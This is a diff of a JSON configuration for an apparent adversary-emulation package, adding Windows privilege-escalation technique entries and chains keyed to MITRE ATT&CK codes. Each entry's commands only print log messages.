+      "command": "Write-Host '[START] T1055.001 - Dynamic-link Library Injection'; Write-Host '[INFO] Emulating T1055.001 (Dynamic-link Library Injection) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Dynamic-link Library Injection (T1055.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.007-Netsh Helper DLL",
+      "name": "Excalibur - Privilege Escalation-T1546.007-Netsh Helper DLL",
+      "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.007",
+      "technique_name": "Netsh Helper DLL",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.007 - Netsh Helper DLL'; Write-Host '[INFO] Emulating T1546.007 (Netsh Helper DLL) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.007 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.007 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Netsh Helper DLL (T1546.007)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1078.003-Local Accounts",
+      "name": "Excalibur - Privilege Escalation-T1078.003-Local Accounts",
+      "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1078.003",
+      "technique_name": "Local Accounts",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1078.003 - Local Accounts'; Write-Host '[INFO] Emulating T1078.003 (Local Accounts) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1078.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1078.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Local Accounts (T1078.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
     }
   ],
   "chains": [
@@ -205,7 +1033,9 @@
       "package": "excalibur",
       "tcode": "T1548",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1548-UAC Bypass fodhelper"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1548-UAC Bypass fodhelper"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1548-UAC Bypass eventvwr",
@@ -213,7 +1043,9 @@
       "package": "excalibur",
       "tcode": "T1548",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1548-UAC Bypass eventvwr"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1548-UAC Bypass eventvwr"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1134-Access Token Manipulation",
@@ -221,7 +1053,9 @@
       "package": "excalibur",
       "tcode": "T1134",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1134-Access Token Manipulation"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1134-Access Token Manipulation"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1053-Scheduled Task as SYSTEM",
@@ -229,7 +1063,9 @@
       "package": "excalibur",
       "tcode": "T1053",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1053-Scheduled Task as SYSTEM"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1053-Scheduled Task as SYSTEM"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1068-Exploitation Surface Enumeration",
@@ -237,7 +1073,9 @@
       "package": "excalibur",
       "tcode": "T1068",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1068-Exploitation for Privilege Escalation"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1068-Exploitation for Privilege Escalation"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1078-Valid Accounts",
@@ -245,7 +1083,9 @@
       "package": "excalibur",
       "tcode": "T1078",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1078-Valid Accounts"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1078-Valid Accounts"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1546-IFEO Debugger Hijack",
@@ -253,7 +1093,9 @@
       "package": "excalibur",
       "tcode": "T1546",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1546-IFEO Debugger Hijack"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1546-IFEO Debugger Hijack"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1574-DLL Search Order Hijacking",
@@ -261,7 +1103,9 @@
       "package": "excalibur",
       "tcode": "T1574",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1574-DLL Search Order Hijacking"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1574-DLL Search Order Hijacking"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1484-Group Policy Modification",
@@ -269,7 +1113,9 @@
       "package": "excalibur",
       "tcode": "T1484",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1484-Group Policy Modification"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1484-Group Policy Modification"
+      ]
     },
     {
       "name": "Excalibur - PrivEsc-T1611-Escape to Host",
@@ -277,7 +1123,9 @@
       "package": "excalibur",
       "tcode": "T1611",
       "tactic": "Privilege Escalation",
-      "script_refs": ["Excalibur - PrivEsc-T1611-Escape to Host"]
+      "script_refs": [
+        "Excalibur - PrivEsc-T1611-Escape to Host"
+      ]
     },
     {
       "name": "Excalibur - Privilege Escalation Full Sweep",
@@ -296,6 +1144,516 @@
         "Excalibur - PrivEsc-T1574-DLL Search Order Hijacking",
         "Excalibur - PrivEsc-T1484-Group Policy Modification",
         "Excalibur - PrivEsc-T1611-Escape to Host"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.011-Extra Window Memory Injection",
+      "description": "Emulation chain for T1055.011: Extra Window Memory Injection.",
+      "package": "excalibur",
+      "tcode": "T1055.011",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.011-Extra Window Memory Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1053.005-Scheduled Task",
+      "description": "Emulation chain for T1053.005: Scheduled Task.",
+      "package": "excalibur",
+      "tcode": "T1053.005",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1053.005-Scheduled Task"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.013-PowerShell Profile",
+      "description": "Emulation chain for T1546.013: PowerShell Profile.",
+      "package": "excalibur",
+      "tcode": "T1546.013",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.013-PowerShell Profile"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1548.002-Bypass User Account Control",
+      "description": "Emulation chain for T1548.002: Bypass User Account Control.",
+      "package": "excalibur",
+      "tcode": "T1548.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1548.002-Bypass User Account Control"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.014-Active Setup",
+      "description": "Emulation chain for T1547.014: Active Setup.",
+      "package": "excalibur",
+      "tcode": "T1547.014",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.014-Active Setup"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1484.002-Trust Modification",
+      "description": "Emulation chain for T1484.002: Trust Modification.",
+      "package": "excalibur",
+      "tcode": "T1484.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1484.002-Trust Modification"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1543.003-Windows Service",
+      "description": "Emulation chain for T1543.003: Windows Service.",
+      "package": "excalibur",
+      "tcode": "T1543.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1543.003-Windows Service"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.012-Print Processors",
+      "description": "Emulation chain for T1547.012: Print Processors.",
+      "package": "excalibur",
+      "tcode": "T1547.012",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.012-Print Processors"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1098.007-Additional Local or Domain Groups",
+      "description": "Emulation chain for T1098.007: Additional Local or Domain Groups.",
+      "package": "excalibur",
+      "tcode": "T1098.007",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1098.007-Additional Local or Domain Groups"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.003-Thread Execution Hijacking",
+      "description": "Emulation chain for T1055.003: Thread Execution Hijacking.",
+      "package": "excalibur",
+      "tcode": "T1055.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.003-Thread Execution Hijacking"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.011-Application Shimming",
+      "description": "Emulation chain for T1546.011: Application Shimming.",
+      "package": "excalibur",
+      "tcode": "T1546.011",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.011-Application Shimming"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.010-Port Monitors",
+      "description": "Emulation chain for T1547.010: Port Monitors.",
+      "package": "excalibur",
+      "tcode": "T1547.010",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.010-Port Monitors"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.009-Shortcut Modification",
+      "description": "Emulation chain for T1547.009: Shortcut Modification.",
+      "package": "excalibur",
+      "tcode": "T1547.009",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.009-Shortcut Modification"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.005-Security Support Provider",
+      "description": "Emulation chain for T1547.005: Security Support Provider.",
+      "package": "excalibur",
+      "tcode": "T1547.005",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.005-Security Support Provider"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1484.001-Group Policy Modification",
+      "description": "Emulation chain for T1484.001: Group Policy Modification.",
+      "package": "excalibur",
+      "tcode": "T1484.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1484.001-Group Policy Modification"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1078.001-Default Accounts",
+      "description": "Emulation chain for T1078.001: Default Accounts.",
+      "package": "excalibur",
+      "tcode": "T1078.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1078.001-Default Accounts"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.003-Time Providers",
+      "description": "Emulation chain for T1547.003: Time Providers.",
+      "package": "excalibur",
+      "tcode": "T1547.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.003-Time Providers"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1134.002-Create Process with Token",
+      "description": "Emulation chain for T1134.002: Create Process with Token.",
+      "package": "excalibur",
+      "tcode": "T1134.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1134.002-Create Process with Token"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.004-Winlogon Helper DLL",
+      "description": "Emulation chain for T1547.004: Winlogon Helper DLL.",
+      "package": "excalibur",
+      "tcode": "T1547.004",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.004-Winlogon Helper DLL"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.012-Image File Execution Options Injection",
+      "description": "Emulation chain for T1546.012: Image File Execution Options Injection.",
+      "package": "excalibur",
+      "tcode": "T1546.012",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.012-Image File Execution Options Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.013-Process Doppelgänging",
+      "description": "Emulation chain for T1055.013: Process Doppelgänging.",
+      "package": "excalibur",
+      "tcode": "T1055.013",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.013-Process Doppelgänging"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.008-Accessibility Features",
+      "description": "Emulation chain for T1546.008: Accessibility Features.",
+      "package": "excalibur",
+      "tcode": "T1546.008",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.008-Accessibility Features"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.004-Asynchronous Procedure Call",
+      "description": "Emulation chain for T1055.004: Asynchronous Procedure Call.",
+      "package": "excalibur",
+      "tcode": "T1055.004",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.004-Asynchronous Procedure Call"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.009-AppCert DLLs",
+      "description": "Emulation chain for T1546.009: AppCert DLLs.",
+      "package": "excalibur",
+      "tcode": "T1546.009",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.009-AppCert DLLs"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1098.005-Device Registration",
+      "description": "Emulation chain for T1098.005: Device Registration.",
+      "package": "excalibur",
+      "tcode": "T1098.005",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1098.005-Device Registration"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.002-Portable Executable Injection",
+      "description": "Emulation chain for T1055.002: Portable Executable Injection.",
+      "package": "excalibur",
+      "tcode": "T1055.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.002-Portable Executable Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1134.001-Token Impersonation/Theft",
+      "description": "Emulation chain for T1134.001: Token Impersonation/Theft.",
+      "package": "excalibur",
+      "tcode": "T1134.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1134.001-Token Impersonation/Theft"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1134.003-Make and Impersonate Token",
+      "description": "Emulation chain for T1134.003: Make and Impersonate Token.",
+      "package": "excalibur",
+      "tcode": "T1134.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1134.003-Make and Impersonate Token"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.003-Windows Management Instrumentation Event Subscription",
+      "description": "Emulation chain for T1546.003: Windows Management Instrumentation Event Subscription.",
+      "package": "excalibur",
+      "tcode": "T1546.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.003-Windows Management Instrumentation Event Subscription"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1134.004-Parent PID Spoofing",
+      "description": "Emulation chain for T1134.004: Parent PID Spoofing.",
+      "package": "excalibur",
+      "tcode": "T1134.004",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1134.004-Parent PID Spoofing"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.001-Change Default File Association",
+      "description": "Emulation chain for T1546.001: Change Default File Association.",
+      "package": "excalibur",
+      "tcode": "T1546.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.001-Change Default File Association"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.001-Registry Run Keys / Startup Folder",
+      "description": "Emulation chain for T1547.001: Registry Run Keys / Startup Folder.",
+      "package": "excalibur",
+      "tcode": "T1547.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.001-Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.012-Process Hollowing",
+      "description": "Emulation chain for T1055.012: Process Hollowing.",
+      "package": "excalibur",
+      "tcode": "T1055.012",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.012-Process Hollowing"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1134.005-SID-History Injection",
+      "description": "Emulation chain for T1134.005: SID-History Injection.",
+      "package": "excalibur",
+      "tcode": "T1134.005",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1134.005-SID-History Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.002-Authentication Package",
+      "description": "Emulation chain for T1547.002: Authentication Package.",
+      "package": "excalibur",
+      "tcode": "T1547.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.002-Authentication Package"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.015-Component Object Model Hijacking",
+      "description": "Emulation chain for T1546.015: Component Object Model Hijacking.",
+      "package": "excalibur",
+      "tcode": "T1546.015",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.015-Component Object Model Hijacking"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1078.002-Domain Accounts",
+      "description": "Emulation chain for T1078.002: Domain Accounts.",
+      "package": "excalibur",
+      "tcode": "T1078.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1078.002-Domain Accounts"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.018-Python Startup Hooks",
+      "description": "Emulation chain for T1546.018: Python Startup Hooks.",
+      "package": "excalibur",
+      "tcode": "T1546.018",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.018-Python Startup Hooks"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1037.003-Network Logon Script",
+      "description": "Emulation chain for T1037.003: Network Logon Script.",
+      "package": "excalibur",
+      "tcode": "T1037.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1037.003-Network Logon Script"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.010-AppInit DLLs",
+      "description": "Emulation chain for T1546.010: AppInit DLLs.",
+      "package": "excalibur",
+      "tcode": "T1546.010",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.010-AppInit DLLs"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.002-Screensaver",
+      "description": "Emulation chain for T1546.002: Screensaver.",
+      "package": "excalibur",
+      "tcode": "T1546.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.002-Screensaver"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.016-Installer Packages",
+      "description": "Emulation chain for T1546.016: Installer Packages.",
+      "package": "excalibur",
+      "tcode": "T1546.016",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.016-Installer Packages"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.005-Thread Local Storage",
+      "description": "Emulation chain for T1055.005: Thread Local Storage.",
+      "package": "excalibur",
+      "tcode": "T1055.005",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.005-Thread Local Storage"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1098.002-Additional Email Delegate Permissions",
+      "description": "Emulation chain for T1098.002: Additional Email Delegate Permissions.",
+      "package": "excalibur",
+      "tcode": "T1098.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1098.002-Additional Email Delegate Permissions"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1037.001-Logon Script (Windows)",
+      "description": "Emulation chain for T1037.001: Logon Script (Windows).",
+      "package": "excalibur",
+      "tcode": "T1037.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1037.001-Logon Script (Windows)"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.015-ListPlanting",
+      "description": "Emulation chain for T1055.015: ListPlanting.",
+      "package": "excalibur",
+      "tcode": "T1055.015",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.015-ListPlanting"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1547.008-LSASS Driver",
+      "description": "Emulation chain for T1547.008: LSASS Driver.",
+      "package": "excalibur",
+      "tcode": "T1547.008",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1547.008-LSASS Driver"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1053.002-At",
+      "description": "Emulation chain for T1053.002: At.",
+      "package": "excalibur",
+      "tcode": "T1053.002",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1053.002-At"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1055.001-Dynamic-link Library Injection",
+      "description": "Emulation chain for T1055.001: Dynamic-link Library Injection.",
+      "package": "excalibur",
+      "tcode": "T1055.001",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1055.001-Dynamic-link Library Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1546.007-Netsh Helper DLL",
+      "description": "Emulation chain for T1546.007: Netsh Helper DLL.",
+      "package": "excalibur",
+      "tcode": "T1546.007",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1546.007-Netsh Helper DLL"
+      ]
+    },
+    {
+      "name": "Excalibur - Privilege Escalation-T1078.003-Local Accounts",
+      "description": "Emulation chain for T1078.003: Local Accounts.",
+      "package": "excalibur",
+      "tcode": "T1078.003",
+      "tactic": "Privilege Escalation",
+      "script_refs": [
+        "Excalibur - Privilege Escalation-T1078.003-Local Accounts"
       ]
     }
   ]
